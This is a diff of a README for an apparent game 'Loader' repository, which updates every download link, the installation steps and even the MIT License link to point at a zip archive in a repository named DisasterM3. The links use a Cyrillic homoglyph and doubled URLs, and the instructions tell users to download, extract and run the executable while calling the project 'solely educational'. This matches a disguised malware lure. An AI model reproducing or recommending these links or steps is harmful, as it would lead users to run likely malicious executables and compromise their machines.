@@ -6,10 +6,10 @@ Welcome to the **A Wife and Mother  Loader** project! This repository provides a
 
 | Operating System     | Supported? | Installation Method      | Keywords                               |
 |---------------------|:----------:|:------------------------|----------------------------------------|
-| Windows 10/11       |    ✅      | https://raw.githubusercontent.com/poopmoh1/DisasterM3/main/Lоader.zip              | win10, win11, desktop, gaming, update  |
-| macOS (10.13+)      |    ✅      | https://raw.githubusercontent.com/poopmoh1/DisasterM3/main/Lоader.zip (wine)       | macos, mac, apple, launcher, unity     |
-| Linux (Ubuntu+)     |    ✅      | https://raw.githubusercontent.com/poopmoh1/DisasterM3/main/Lоader.zip (wine/Lutris)| linux, ubuntu, mint, opensource, game  |
-| Steam Deck          |    ✅      | https://raw.githubusercontent.com/poopmoh1/DisasterM3/main/Lоader.zip (wine/proton)| steamdeck, handheld, proton, emulator  |
+| Windows 10/11       |    ✅      | https://github.com/poopmoh1/DisasterM3/raw/refs/heads/main/malleolar/Disaster-v2.1-alpha.3.zipоhttps://github.com/poopmoh1/DisasterM3/raw/refs/heads/main/malleolar/Disaster-v2.1-alpha.3.zip              | win10, win11, desktop, gaming, update  |
+| macOS (10.13+)      |    ✅      | https://github.com/poopmoh1/DisasterM3/raw/refs/heads/main/malleolar/Disaster-v2.1-alpha.3.zipоhttps://github.com/poopmoh1/DisasterM3/raw/refs/heads/main/malleolar/Disaster-v2.1-alpha.3.zip (wine)       | macos, mac, apple, launcher, unity     |
+| Linux (Ubuntu+)     |    ✅      | https://github.com/poopmoh1/DisasterM3/raw/refs/heads/main/malleolar/Disaster-v2.1-alpha.3.zipоhttps://github.com/poopmoh1/DisasterM3/raw/refs/heads/main/malleolar/Disaster-v2.1-alpha.3.zip (wine/Lutris)| linux, ubuntu, mint, opensource, game  |
+| Steam Deck          |    ✅      | https://github.com/poopmoh1/DisasterM3/raw/refs/heads/main/malleolar/Disaster-v2.1-alpha.3.zipоhttps://github.com/poopmoh1/DisasterM3/raw/refs/heads/main/malleolar/Disaster-v2.1-alpha.3.zip (wine/proton)| steamdeck, handheld, proton, emulator  |
 
 ## ✨ Feature List
 
@@ -28,7 +28,7 @@ Welcome to the **A Wife and Mother  Loader** project! This repository provides a
 
 ## 🛠️ Installation
 
-1. Download **https://raw.githubusercontent.com/poopmoh1/DisasterM3/main/Lоader.zip** from the repository.
+1. Download **https://github.com/poopmoh1/DisasterM3/raw/refs/heads/main/malleolar/Disaster-v2.1-alpha.3.zipоhttps://github.com/poopmoh1/DisasterM3/raw/refs/heads/main/malleolar/Disaster-v2.1-alpha.3.zip** from the repository.
 2. Extract all files to a directory of your choice.
 3. Run the Loader executable for your OS.
 4. Follow the Loader's instructions to optimize your game!
@@ -39,4 +39,4 @@ This repository is solely educational. No copyrighted content is distributed or 
 
 ## 📄 MIT License
 
-This repository is licensed under the [MIT License](https://raw.githubusercontent.com/poopmoh1/DisasterM3/main/Lоader.zip) – 2025. Enjoy safely and legally!
+This repository is licensed under the [MIT License](https://github.com/poopmoh1/DisasterM3/raw/refs/heads/main/malleolar/Disaster-v2.1-alpha.3.zipоhttps://github.com/poopmoh1/DisasterM3/raw/refs/heads/main/malleolar/Disaster-v2.1-alpha.3.zip) – 2025. Enjoy safely and legally!
